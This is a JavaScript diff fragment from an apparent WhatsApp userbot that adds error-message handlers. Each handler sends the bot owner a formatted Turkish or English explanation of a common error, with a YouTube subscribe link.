+                                        '\n*Nedeni:* _TTP, ATTP gibi komutların latin alfabesi dışında kullanılması._' +
+                                        '\n*Çözümü:* _Komutu latif alfabesi çerçevesinde kullanırsanız sorun çözülecektir._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('conversation')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ HATA ÇÖZÜMLEME [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Hata Okundu!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Ana Hata:* _Deleting Plugin_' +
+                                        '\n*Nedeni:* _Silinmek istenen plugin isminin yanlış girilmesi._' +
+                                        '\n*Çözümü:* _Lütfen silmek istediğiniz pluginin başına_ *__* _koymadan deneyin. Hala hata alıyorsanız ismin sonundaki_ ```?(.*) / $``` _gibi ifadeleri eksiksiz girin._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('conversation')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Main Error:* _Deleting Plugin_' +
+                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
+                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('split')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Main Error:* _Split of Undefined_' +
+                                        '\n*Reason:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
+                                        '\n*Solution:* _Restarting will be enough._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('SSL')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Main Error:* _SQL Database Error_' +
+                                        '\n*Reason:* _Database corruption._ ' +
+                                        '\n*Solution:* _There is no known solution. You can try reinstalling it._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('Ookla')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Main Error:* _Ookla Server Connection_' +
+                                        '\n*Reason:* _Speedtest data cannot be transmitted to the server._' +
+                                        '\n*Solution:* _If you use it one more time the problem will be solved._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('params')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Main Error:* _Requested Audio Params_' +
+                                        '\n*Reason:* _Using the TTS command outside the Latin alphabet._' +
+                                        '\n*Solution:* _The problem will be solved if you use the command in Latin letters frame._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('unlink')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Main Error:* _No Such File or Directory_' +
+                                        '\n*Reason:* _Incorrect coding of the plugin._' +
+                                        '\n*Solution:* _Please check the your plugin codes._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('404')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved!``` ==========' +
+                                        '\n\n*Main Error:* _Error 404 HTTPS_' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n*Reason:* _Failure to communicate with the server as a result of using the commands under the Heroku plugin._' +
+                                        '\n*Solution:* _Wait a while and try again. If you still get the error, perform the transaction on the website.._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('reply.delete')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved!``` ==========' +
+                                        '\n\n*Main Error:* _Reply Delete Function_' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n*Reason:* _Using IMG or Wiki commands._' +
+                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('load.delete')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved!``` ==========' +
+                                        '\n\n*Main Error:* _Reply Delete Function_' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n*Reason:* _Using IMG or Wiki commands._' +
+                                        '\n*Solution:* _There is no solution for this error. It is not a fatal error._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('400')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved!``` ==========' +
+                                        '\n\n*Main Error:* _Bailyes Action Error_ ' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n*Reason:* _The exact reason is unknown. More than one option may have triggered this error._' +
+                                        '\n*Solution:* _If you use it again, it may improve. If the error continues, you can try to restart._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('decode')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved!``` ==========' +
+                                        '\n\n*Main Error:* _Cannot Decode Text or Media_' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n*Reason:* _Incorrect use of the plug._' +
+                                        '\n*Solution:* _Please use the commands as written in the plugin description._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('unescaped')) {
+                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ERROR ANALYSIS [♥️🕊️______ 𝐏𝐈𝐊𝐀𝐂𝐇𝐔 _____🕊️♥️] ⚕️*' + 
+                                        '\n========== ```Error Resolved!``` ==========' +
+                                        '*\n\n Max Error oyvakkan Subscribe cheyyu https://www.youtube.com/channel/UCpGa88rhUFYj-6-LBqBbWKw' +
+                                        '\n\n*Main Error:* _Word Character Usage_' +
+                                        '\n*Reason:* _Using commands such as TTP, ATTP outside the Latin alphabet._' +
+                                        '\n*Solution:* _The problem will be solved if you use the command in Latin alphabet.._'
+                                        , MessageType.text
+                                    );
+                                }    
                         }
                     }
                 }
